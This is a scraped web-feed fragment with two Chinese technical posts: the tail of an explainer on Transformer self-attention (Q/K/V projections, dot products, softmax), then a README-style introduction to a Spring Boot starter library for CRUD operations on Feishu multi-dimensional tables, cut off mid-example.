<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9d2ec503f7945f685068c30b47e5ac9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=PjOPACEi3PV8cdwwBQtOL1vkD5g%3D" alt="image" loading="lazy"/><br/>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba5b9be9914b4f08bd0773439f1c2aee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=S8y%2Bs0y2xnZnUtApQz8a62uZvAc%3D" alt="image" loading="lazy"/></p>
<h3 data-id="heading-4">3.增加可学习参数</h3>
<p>每个线性变换 W_Q, W_K, W_V都是 <strong>可训练权重</strong>，模型可以自动学习如何对不同 token 的 embedding 做不同的查询、匹配和加权。</p>
<p>这使得 self-attention 不只是一个固定的相似度计算，而是一个 <strong>可调节、可优化的语义匹配函数</strong>。</p>
<h3 data-id="heading-5">4.便于下游操作</h3>
<p>QK^T 计算的是注意力权重，如果不做线性变换，模型只能依赖原始 embedding 的内积，这种相似度空间不一定适合 softmax 加权。</p>
<p>线性变换可以把 embedding 投影到更适合做<strong>注意力匹配</strong>的空间，提高学习能力。</p>
<h2 data-id="heading-6">三、Q 与 K 的点积</h2>
<p>拿到 Q 和 K 后，self-attention 计算的是每个 Query 与所有 Key 的相似度：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23e4c56e257f4c49a789bcad38f23b4f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=O4eHDAusy8OpmKQ1fkwwQwqrWMY%3D" alt="image" loading="lazy"/></p>
<p>这里的点积代表<strong>匹配程度</strong>，即：</p>
<ul>
<li>Q_i 表示第 i 个 token 想关注的信息；</li>
<li>K_j 表示第 j 个 token 所包含的信息；</li>
<li>它们的点积越大，说明第 i 个 token 越应该关注第 j 个 token。</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20bc14ecd2c34b7d97063f169c5a2645~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=pf%2FU9Y1ZZ9G1zhC3357vTnCupKU%3D" alt="" loading="lazy"/></p>
<p>从计算上看，点积是将所有的对齐分量相乘并累加；从几何上看，当向量指向相似方向时，点积为正，如果向量垂直，点积为0，当向量方向相反时则为负数。</p>
<p>这样，我们就得到了一个注意力分数矩阵，表示每个 token 对其他 token 的<strong>注意力权重</strong>。</p>
<h2 data-id="heading-7">四、为什么要用 Softmax？</h2>
<p>问题来了：我们已经有了相似度分数，为什么还要再过一遍 Softmax？</p>
<p>其实原因很简单：</p>
<ol>
<li><strong>把“相似度”变成“权重分布”</strong><br/>
点积结果可以是任意实数，而 Softmax 会把它们压缩到 ( [0, 1] ) 区间，并且所有权重之和为 1。<br/>
这让注意力分数能被解释为概率分布，即模型在关注谁、关注多少。</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8069bf7529a64711b9cf9c52fb2991af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=8CVFjNuXSnO%2Fqs7xJnil4Lbqs0U%3D" alt="" loading="lazy"/></p>
<ol start="2">
<li><strong>放大强关注、削弱弱关注</strong><br/>
Softmax 有指数特性，会让大的分数更大、小的分数更小，从而突出主导注意力。<br/>
这在语义建模中非常关键——模型不会平均地看所有 token，而是能<strong>聚焦重点</strong>。</li>
<li><strong>梯度稳定性</strong><br/>
如果直接用点积做加权，分数可能过大或过小，导致梯度不稳定。<br/>
Softmax 保证了数值范围可控，梯度传播更平滑。</li>
</ol>
<p>最后一步，把注意力权重乘上 Value：<br/>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d8372c1f342a478dbc2d308d1f2c1205~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=Tk4c3Qr%2FXEmr9C5Xlgc7IYTxp3s%3D" alt="image" loading="lazy"/><br/>
就得到了每个 token 根据上下文动态加权后的新表示。</p>
<p>总结一下，Q、K、V 的线性变换是为了让模型从同一输入中生成<strong>不同功能的向量表示</strong>，分别负责提问、匹配和传递信息，增强模型的表达灵活性。</p>
<p>Softmax 的作用则是把相似度分数转成稳定的注意力分布，突出重点并保证梯度可训练。</p>
<p><strong>📚</strong> <strong>推荐阅读</strong></p>
<p>● <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1918047303597552480" target="_blank" title="https://zhuanlan.zhihu.com/p/1918047303597552480" ref="nofollow noopener noreferrer">一览Transformer整体架构</a><br/>
● <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1918049072331362469" target="_blank" title="https://zhuanlan.zhihu.com/p/1918049072331362469" ref="nofollow noopener noreferrer">Transformer——Attention怎么实现集中注意力</a><br/>
● <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1918050616376301224" target="_blank" title="https://zhuanlan.zhihu.com/p/1918050616376301224" ref="nofollow noopener noreferrer">Transformer——FeedForward模块在干什么？</a><br/>
● <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1918357249883105145" target="_blank" title="https://zhuanlan.zhihu.com/p/1918357249883105145" ref="nofollow noopener noreferrer">从0开始实现Transformer</a><br/>
● <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1919338888536756837" target="_blank" title="https://zhuanlan.zhihu.com/p/1919338888536756837" ref="nofollow noopener noreferrer">什么是KV-Cache</a><br/>
● <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1919500956946655189" target="_blank" title="https://zhuanlan.zhihu.com/p/1919500956946655189" ref="nofollow noopener noreferrer">Transformer注意力机制——MHA&amp;MQA&amp;GQA</a><br/>
● <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1923328314241704991" target="_blank" title="https://zhuanlan.zhihu.com/p/1923328314241704991" ref="nofollow noopener noreferrer">FlashAttention怎么提升速度的？</a><br/>
● <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1963547933044631464" target="_blank" title="https://zhuanlan.zhihu.com/p/1963547933044631464" ref="nofollow noopener noreferrer">面试官：BatchNorm、LayerNorm、GroupNorm、InstanceNorm 有什么本质区别？</a><br/>
● <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1962254381677257759" target="_blank" title="https://zhuanlan.zhihu.com/p/1962254381677257759" ref="nofollow noopener noreferrer">面试官：Transformer如何优化到线性级？</a><br/>
● <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1923714840653993730" target="_blank" title="https://zhuanlan.zhihu.com/p/1923714840653993730" ref="nofollow noopener noreferrer">FlashAttention2：更快的注意力机制，更好的并行效率</a><br/>
● <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1924154277082961318" target="_blank" title="https://zhuanlan.zhihu.com/p/1924154277082961318" ref="nofollow noopener noreferrer">FlashAttention3 全解析：速度、精度、显存的再平衡</a><br/>
● <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1971661595559059790" target="_blank" title="https://zhuanlan.zhihu.com/p/1971661595559059790" ref="nofollow noopener noreferrer">Transformer 中为什么用LayerNorm而不用BatchNorm？</a></p>
<p>关于深度学习和AI大模型相关的知识和前沿技术更新，请关注公众号 <strong>aicoting</strong>！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringBoot 接入飞书多维表格，快速跑通MVP应用]]></title>    <link>https://juejin.cn/post/7589092567544119305</link>    <guid>https://juejin.cn/post/7589092567544119305</guid>    <pubDate>2025-12-29T09:36:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589092567544119305" data-draft-id="7589093895326367753" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBoot 接入飞书多维表格，快速跑通MVP应用"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-29T09:36:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Corbing"/> <meta itemprop="url" content="https://juejin.cn/user/1284695418219886"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringBoot 接入飞书多维表格，快速跑通MVP应用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1284695418219886/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Corbing
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:36:43.000Z" title="Mon Dec 29 2025 09:36:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">项目地址：</h2>
<ul>
<li>Gitee: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fbdmcom%2Ffs-dw-table-springboot-starter" target="_blank" title="https://gitee.com/bdmcom/fs-dw-table-springboot-starter" ref="nofollow noopener noreferrer">gitee.com/bdmcom/fs-d…</a></li>
<li>GitHub: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbendangmi%2Ffs-dw-table-springboot-starter" target="_blank" title="https://github.com/bendangmi/fs-dw-table-springboot-starter" ref="nofollow noopener noreferrer">github.com/bendangmi/f…</a></li>
</ul>
<h2 data-id="heading-1">项目说明</h2>
<ul>
<li>将飞书多维表格作为数据源，像操作 MySQL 等数据库一样完成数据 CRUD</li>
<li>查询能力对标 MyBatis-Plus，使用 <code>DwLambdaQueryWrapper</code> 完成条件构造</li>
<li>屏蔽底层 Open API 调用，开发者只需引入依赖并填写飞书配置</li>
</ul>
<h2 data-id="heading-2">架构设计</h2>
<h3 data-id="heading-3">分层架构</h3>
<pre><code class="hljs language-scss" lang="scss">┌─────────────────────────────────────────────────────────────┐
│                        应用层 (Application)                   │
│  FsDwRecordHelper / FsDwTableHelper / FsDwFieldHelper       │
└─────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────┐
│                        服务层 (Service)                      │
│     FsDwRecordService / FsDwTableService / FsDwFieldService │
│                      FsDwTokenService                        │
└─────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────┐
│                         API层 (HTTP Client)                  │
│      FsDwRecordApi / FsDwTableApi / FsDwFieldApi             │
│                    (Forest 声明式 HTTP 客户端)                │
└─────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────┐
│                      飞书多维表格 Open API                    │
└─────────────────────────────────────────────────────────────┘
</code></pre>
<h3 data-id="heading-4">核心组件</h3>













































<table><thead><tr><th>组件</th><th>职责</th><th>说明</th></tr></thead><tbody><tr><td><code>@EnableFsDwTable</code></td><td>启用自动配置</td><td>显式启用，避免与其他实现冲突</td></tr><tr><td><code>FsDwAutoConfiguration</code></td><td>自动配置类</td><td>注册所有核心 Bean 并扫描 Forest 接口</td></tr><tr><td><code>FsDwProperties</code></td><td>配置属性</td><td>绑定 <code>duoweitable.*</code> 配置项</td></tr><tr><td><code>FsDwTokenService</code></td><td>Token 管理</td><td>使用 Caffeine 高性能缓存，支持并发和统计</td></tr><tr><td><code>DwLambdaQueryWrapper</code></td><td>查询构造器</td><td>MyBatis-Plus 风格的 Lambda 类型安全查询</td></tr><tr><td><code>FsDwRecordHelper</code></td><td>记录操作助手</td><td>静态工具方法，便捷 CRUD 操作</td></tr><tr><td><code>BitableException</code></td><td>统一异常</td><td>携带错误码的异常体系</td></tr></tbody></table>
<h3 data-id="heading-5">注解体系</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@FsDwAppBase(appToken = "app_token")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoAppBase</span> {
}

<span class="hljs-meta">@FsDwTable(name = "表名", tableId = "tblxxx", viewId = "vewxxx")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Entity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DemoAppBase</span> {
    <span class="hljs-meta">@FsDwTableId</span>                    <span class="hljs-comment">// 标记记录 ID 字段</span>
    <span class="hljs-keyword">private</span> String recordId;

    <span class="hljs-meta">@FsDwTableProperty(value = "字段名", order = 1, type = TypeEnum.TEXT)</span>
    <span class="hljs-keyword">private</span> String fieldName;
}
</code></pre>
<h3 data-id="heading-6">HTTP 客户端</h3>
<p>本项目使用 <strong>Forest</strong> 作为 HTTP 客户端，相比 RestTemplate/WebClient：</p>
<ul>
<li>声明式接口定义，无需手写请求代码</li>
<li>自动 JSON 序列化/反序列化</li>
<li>支持拦截器、过滤器等扩展机制</li>
<li>底层使用 OkHttp，性能优异</li>
</ul>
<h3 data-id="heading-7">缓存策略</h3>
<p><strong>Token 缓存</strong> 使用 Caffeine：</p>
<ul>
<li>自动过期（2小时）</li>
<li>并发安全（基于 ConcurrentHashMap）</li>
<li>LRU 淘汰策略（最多 100 个 token）</li>
<li>支持统计信息（命中率等）</li>
<li>提前 60 秒刷新缓冲</li>
</ul>
<h2 data-id="heading-8">解决的问题</h2>
<ul>
<li>免去 Token 鉴权、请求构造、响应解析等“胶水工作”，业务层只保留 CRUD 语义</li>
<li>统一字段映射与类型转换，减少手写 JSON/Map 与字段名不一致的风险</li>
<li>提供类数据库的条件查询与分页能力，让数据访问更易维护、可读</li>
</ul>
<h2 data-id="heading-9">项目亮点</h2>
<ul>
<li>通过 @EnableFsDwTable 显式启用自动配置 + Forest 扫描，避免与其他实现冲突</li>
<li>注解驱动实体映射（<code>@FsDwAppBase</code> / <code>@FsDwTable</code> / <code>@FsDwTableProperty</code> / <code>@FsDwTableId</code>），支持元字段读取</li>
<li><code>DwLambdaQueryWrapper</code> 提供 MyBatis-Plus 风格的条件、排序、分页与字段选择</li>
<li>记录/表/字段多层级 Helper 与 Service 组合，兼顾简单调用与可扩展集成</li>
<li>Token 内存缓存 + 提前刷新缓冲，降低频繁鉴权请求</li>
<li>统一错误码与断言体系（<code>BitableException</code> / <code>BitableErrorCode</code>）</li>
</ul>
<h2 data-id="heading-10">功能特性</h2>
<ul>
<li>启用注解后自动配置并扫描 Forest HTTP 客户端</li>
<li>注解驱动实体映射（<code>@FsDwAppBase</code> / <code>@FsDwTable</code> / <code>@FsDwTableProperty</code> / <code>@FsDwTableId</code>），支持元字段映射</li>
<li>类数据库的 CRUD 体验，屏蔽飞书多维表格底层调用</li>
<li>MyBatis-Plus 风格查询，<code>DwLambdaQueryWrapper</code> 条件构造</li>
<li>记录、数据表、字段操作的 Helper API</li>
<li>统一异常与错误码（<code>BitableException</code> / <code>BitableErrorCode</code>）</li>
</ul>
<h2 data-id="heading-11">运行环境</h2>
<ul>
<li>Java 17+</li>
<li>Spring Boot 3.x</li>
<li>飞书应用凭证（appId、appSecret），appToken 由 @FsDwAppBase 提供</li>
</ul>
<h2 data-id="heading-12">安装</h2>
<p>Maven:</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.bdmcom<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fs-dw-table-springboot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>Gradle:</p>
<pre><code class="hljs language-kotlin" lang="kotlin">dependencies {
  implementation(<span class="hljs-string">"cn.bdmcom:fs-dw-table-springboot-starter:1.0.0"</span>)
}
</code></pre>
<h2 data-id="heading-13">配置</h2>
<p>最小配置（Helper API 必需）：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">duoweitable:</span>
  <span class="hljs-attr">app-id:</span> <span class="hljs-string">your-app-id</span>
  <span class="hljs-attr">app-secret:</span> <span class="hljs-string">your-app-secret</span>
</code></pre>
<p><code>application.properties</code> 等价写法：</p>
<pre><code class="hljs language-properties" lang="properties">duoweitable.app-id=your-app-id
duoweitable.app-secret=your-app-secret
</code></pre>
<p>appToken 建议放在实体父类的 <code>@FsDwAppBase</code> 中（appToken 相当于一个 Excel，tableId 相当于一个 Sheet）：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@FsDwAppBase(appToken = "app_token")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoAppBase</span> {
}
</code></pre>
<p>Forest 客户端可选配置（仅在需要覆盖时配置）：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">forest:</span>
  <span class="hljs-attr">backend:</span> <span class="hljs-string">okhttp3</span>
  <span class="hljs-attr">connect-timeout:</span> <span class="hljs-number">5000</span>
  <span class="hljs-attr">read-timeout:</span> <span class="hljs-number">5000</span>
  <span class="hljs-attr">max-retry-count:</span> <span class="hljs-number">0</span>
</code></pre>
<h2 data-id="heading-14">启用方式（3 步）</h2>
<ol>
<li>引入依赖</li>
<li>配置参数</li>
<li>启动类加注解（不加注解不会加载 Starter，已禁用 AutoConfiguration.imports 自动装配）</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> cn.bdmcom.annotation.EnableFsDwTable;
<span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;
<span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;

<span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@EnableFsDwTable</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoApplication</span> {
  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
    SpringApplication.run(DemoApplication.class, args);
  }
}
</code></pre>
<h2 data-id="heading-15">注意事项（已使用 Forest 的项目）</h2>
<p>如果你的项目已经使用了 Forest，并且自己加了 <code>@ForestScan</code>，请把 <code>cn.bdmcom.core.api</code> 加到
<code>basePackages</code>，否则 Starter 的接口不会被扫描到：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.dtflys.forest.springboot.annotation.ForestScan;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;

<span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@ForestScan(basePackages = {
  "your.project.forest.clients",
  "cn.bdmcom.core.api"
})</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ForestClientConfig</span> {
}
</code></pre>
<h2 data-id="heading-16">快速开始</h2>
<h3 data-id="heading-17">1) 定义 App 基类</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@FsDwAppBase(appToken = "app_token")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoAppBase</span> {
}
</code></pre>
<h3 data-id="heading-18">2) 定义实体</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@FsDwTable(name = "Test Table", tableId = "tblxxxxx", viewId = "vewxxxxx")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestTable</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DemoAppBase</span> {
  <span class="hljs-meta">@FsDwTableId</span>
  <span class="hljs-keyword">private</span> String recordId;

  <span class="hljs-meta">@FsDwTableProperty(value = "Name", order = 1, type = TypeEnum.TEXT)</span>
  <span class="hljs-keyword">private</span> String name;

  <span class="hljs-meta">@FsDwTableProperty(value = "Age", order = 2, type = TypeEnum.NUMBER)</span>
  <span class="hljs-keyword">private</span> Integer age;
}
</code></pre>
<h3 data-id="heading-19">3) 查询记录</h3>
<pre><code class="hljs language-java" lang="java">List&lt;TestTable&gt; records = FsDwRecordHelper.queryRecords(TestTable.class);
</code></pre>
<h3 data-id="heading-20">4) 新增记录</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">TestTable</span> <span class="hljs-variable">add</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestTable</span>();
add.setName(<span class="hljs-string">"Alice"</span>);
add.setAge(<span class="hljs-number">18</span>);
<span class="hljs-type">AddRecordRes</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> FsDwRecordHelper.addRecord(add);
</code></pre>
<h3 data-id="heading-21">5) 批量新增记录</h3>
<pre><code class="hljs language-java" lang="java">List&lt;TestTable&gt; batch = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
  <span class="hljs-type">TestTable</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestTable</span>();
  item.setName(<span class="hljs-string">"User-"</span> + i);
  item.setAge(<span class="hljs-number">18</span>);
  batch.add(item);
}
<span class="hljs-type">BatchCreateRecordRes</span> <span class="hljs-variable">batchRes</span> <span class="hljs-operator">=</span> FsDwRecordHelper.batchCreateRecords(TestTable.class, batch);
</code></pre>
<h3 data-id="heading-22">6) 更新记录</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">TestTable</span> <span class="hljs-variable">update</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestTable</span>();
update.setRecordId(<span class="hljs-string">"recxxxxxx"</span>);
update.setName(<span class="hljs-string">"Alice"</span>);
<span class="hljs-type">UpdateRecordRes</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> FsDwRecordHelper.updateRecord(update);
</code></pre>
<h3 data-id="heading-23">7) 删除记录</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">TestTable</span> <span class="hljs-variable">del</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestTable</span>();
del.setRecordId(<span class="hljs-string">"recxxxxxx"</span>);
